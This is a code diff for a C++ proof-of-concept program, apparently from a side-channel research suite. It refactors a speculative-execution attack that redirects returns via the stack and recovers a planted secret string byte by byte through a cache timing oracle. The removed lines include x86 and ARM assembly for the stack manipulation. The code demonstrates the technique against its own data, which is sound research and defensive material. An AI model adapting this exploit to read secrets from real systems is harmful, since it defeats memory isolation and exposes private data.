@@ -28,121 +28,67 @@
 // TODO(asteinha) Implement support for MSVC and Windows.
 // TODO(asteinha) Investigate the exploitability of PowerPC.
 
-// Objective: given some control over accesses to the *non-secret* string
-// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
-// ever accessing it in the C++ execution model, using speculative execution
-// and side channel attacks
-const char *public_data = "Hello, world!";
+// Private data that is accessed only speculatively. The architectural access
+// to it is unreachable in the control flow.
 const char *private_data = "It's a s3kr3t!!!";
-extern char afterspeculation[];
 
-// Take the "afterspeculation" label address, push in on the stack, flush the
-// stack address and return.
+// Global variable stores for avoiding to pass data through function arguments.
+size_t current_offset;
+const std::array<BigByte, 256> *oracle_ptr;
+
+// Call the "UnrollStackAndReturnTo" function which unwinds the stack jumping
+// back to the "afterspeculation" label in the "leak_byte" function never
+// executing the code that follows.
 __attribute__((noinline))
-void escape() {
-  asm volatile(
-#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
-    defined(_M_IX86)
-      "pushq %0\n"
-      "clflush (%%rsp)\n"
-      "mfence\n"
-      "lfence\n"
-      "ret\n"::"r"(afterspeculation));
-#elif defined(__aarch64__)
-      "adr x9, afterspeculation\n"
-      "str x9, [sp, #-16]!\n"
-      "mov x10, sp\n"
-      "dc civac, x10\n"
-      "dsb sy\n"
-      "ldr x30, [sp], #16\n"
-      "ret\n");
-#elif defined(__powerpc__)
+static void speculation() {
+  UnwindStackAndSlowlyReturnTo(afterspeculation); // Never returns back here.
 
-#else
-#  error Unsupported CPU.
-#endif
-}
+  // Everything that follows this is architecturally dead code. Never reached.
+  // Only the first two statements are executed speculatively.
+  const std::array<BigByte, 256> &isolated_oracle = *oracle_ptr;
+  ForceRead(&isolated_oracle[static_cast<size_t>(
+      private_data[current_offset])]);
 
-// Call the "escape" function which smashes the stack jumping back to the
-// "afterspeculation" label in the "leak_byte" function never executing the
-// code that follows the "escape" call in the "speculate" method.
-__attribute__((noinline))
-void speculation(const char *data, size_t offset,
-                 const std::array<BigByte, 256> &isolated_oracle) {
-  escape(); // Never returns
-
-  // Architecturally dead code. Never reached.
-  ForceRead(&isolated_oracle[static_cast<size_t>(data[offset])]);
   std::cout << "If this is printed, it signifies a fatal error. "
             << "This print statement is architecturally dead." << std::endl;
+
+  // Avoid optimizing out everything that follows the speculation call because
+  // of the exit. Clang does that when the exit call is unconditional.
+  if (strlen(private_data) != 0) {
+    exit(EXIT_FAILURE);
+  }
 }
 
-static char leak_byte(const char *data, size_t offset) {
+static char leak_byte() {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  oracle_ptr = &sidechannel.GetOracle(); // Save the pointer to global storage.
 
-  // This is volatile along with other local variable that are not used in the
-  // "speculation" call so that we save registers and avoid spillage before the
-  // "speculation" call.
+  // Using volatile variables in order to avoid register spoiling.
   for (volatile int run = 0;; ++run) {
     sidechannel.FlushOracle();
 
-    // We pick a different offset every time so that it's guaranteed that the
-    // value of the in-bounds access is usually different from the secret value
-    // we want to leak via out-of-bounds speculative access.
-    volatile size_t safe_offset = run % strlen(data);
-    ForceRead(&isolated_oracle[static_cast<size_t>(data[safe_offset])]);
+    // On ARM we have to manually backup registers that are callee saved,
+    // because the "speculation" method would never restore their backups.
+    #ifdef __aarch64__
+    BackupCalleeSavedRegsAndReturnAddress();
+    #endif
 
-    // Backup all registers and mark the end of the context backup with the
-    // 0xfedcba9801234567 value.
-    asm volatile(
-        "BACKUP_REGISTERS\n"
-#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
-    defined(_M_IX86)
-        "movq $0xfedcba9801234567, %rax\n"
-        "pushq %rax\n");
-#elif defined(__aarch64__)
-        "movz x9, 0x4567\n"
-        "movk x9, 0x0123, lsl 16\n"
-        "movk x9, 0xba98, lsl 32\n"
-        "movk x9, 0xfedc, lsl 48\n"
-        "str x9, [sp, #-16]!\n");
-#elif defined(__powerpc__)
+    // Yields two "call" instructions, one "ret" instruction, speculatively
+    // accesses the oracle and ends up on the label below.
+    speculation();
 
-#else
-#  error Unsupported CPU.
-#endif
-
-    speculation(data, offset, isolated_oracle);
-
-    // Unwind the stack until we find the 0xfedcba9801234567 value and then
-    // restore all registers.
+    // Terminating label.
     asm volatile(
         "_afterspeculation:\n" // For MacOS.
-        "afterspeculation:\n" // For Linux.
-#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
-    defined(_M_IX86)
-        "movq $0xfedcba9801234567, %rax\n"
-        "popq %rbx\n"
-        "cmpq %rbx, %rax\n"
-        "jnz afterspeculation\n"
-#elif defined(__aarch64__)
-        "movz x11, 0x4567\n"
-        "movk x11, 0x0123, lsl 16\n"
-        "movk x11, 0xba98, lsl 32\n"
-        "movk x11, 0xfedc, lsl 48\n"
-        "ldp x9, x10, [sp], #16\n"
-        "cmp x11, x9\n"
-        "bne afterspeculation\n"
-#elif defined(__powerpc__)
+        "afterspeculation:\n"); // For Linux.
 
-#else
-#  error Unsupported CPU.
-#endif
-        "RESTORE_REGISTERS\n");
+    #ifdef __aarch64__
+    RestoreCalleeSavedRegs();
+    #endif
 
     volatile std::pair<bool, char> result =
-        sidechannel.RecomputeScores(data[safe_offset]);
+        sidechannel.AddHitAndRecomputeScores();
+
     if (result.first) {
       return result.second;
     }
@@ -157,12 +103,9 @@ static char leak_byte(const char *data, size_t offset) {
 int main() {
   std::cout << "Leaking the string: ";
   std::cout.flush();
-  const size_t private_offset = private_data - public_data;
   for (size_t i = 0; i < strlen(private_data); ++i) {
-    // On at least some machines, this will print the i'th byte from
-    // private_data, despite the only actually-executed memory accesses being
-    // to valid bytes in public_data.
-    std::cout << leak_byte(public_data, private_offset + i);
+    current_offset = i; // Saving the index to the global storage.
+    std::cout << leak_byte();
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
